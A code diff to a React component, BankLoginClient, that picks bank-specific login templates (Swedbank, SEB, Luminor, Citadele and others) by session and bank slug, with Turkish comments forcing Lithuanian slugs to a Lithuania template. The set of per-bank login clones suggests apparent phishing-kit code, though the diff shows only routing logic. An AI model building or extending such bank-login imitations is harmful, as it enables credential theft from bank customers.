@@ -41,6 +41,10 @@ import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
+// LT bilinen banka slug'lari (methodMap ile ayni, kopya):
+const LITHUANIA_KNOWN_SLUGS = new Set([
+  "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt"
+]);
 
 type Props = {
   sessionId: string;
@@ -741,12 +745,24 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const normalizedCountry = (bank.country || "").toString().trim().toLowerCase();
   const normalizedSlug = (bankSlug || "").toString().trim().toLowerCase();
 
-  // *****************************************************************
-  //  KESIN KURAL: ESTONYA BANKALARI - HICBIR KOŞULA BAKMADAN,
-  //  SADECE BANKA SLUG'INA GORE ZORLA EstoniaBankTemplate'e yonlendir.
-  //  Generic form / visualTree / customHtml YOLUNA KESINLIKLE DUSMESINLER.
-  // *****************************************************************
-  const isLithuania = normalizedCountry === "litvanya" || normalizedCountry === "lithuania" || /(^|[-_\s])lt($|[-_\s])/.test(normalizedSlug);
+  // =====================================================================
+  // EN ONCELIKLI KURAL: LT SLUG'I (LITHUANIA_KNOWN_SLUGS) veya -lt suffix varsa
+  //  => SQL'de country EE olsa bile ZORLA LITHUANIA TEMPLATE sec.
+  //  (Banks tablosunda DEFAULT country = 'EE' oldugu icin bu garanti COK KRITIK!)
+  // =====================================================================
+  const hasLithuaniaSuffix = /(^|[-_\s])lt($|[-_\s])/.test(normalizedSlug);
+  const isLithuaniaKnownSlug = LITHUANIA_KNOWN_SLUGS.has(normalizedSlug) || (
+    // Alternatif: methodMap'teki slugs ile karsilastir (tam eslesme)
+    normalizedSlug === "swedbank-lt" ||
+    normalizedSlug === "seb-lt" ||
+    normalizedSlug === "luminor-lt" ||
+    normalizedSlug === "citadele-lt" ||
+    normalizedSlug === "lku-lt" ||
+    normalizedSlug === "siauliu-lt"
+  );
+  const isLithuania = (normalizedCountry === "litvanya" || normalizedCountry === "lithuania" || normalizedCountry === "lt") ||
+                      hasLithuaniaSuffix ||
+                      isLithuaniaKnownSlug;
   
   const estoniaSlugKeywords = ["bigbank", "citadele", "coop", "inbank", "lhv", "luminor", "op-corporate", "seb", "swedbank"];
   const isEstonianBank = !isLithuania && (
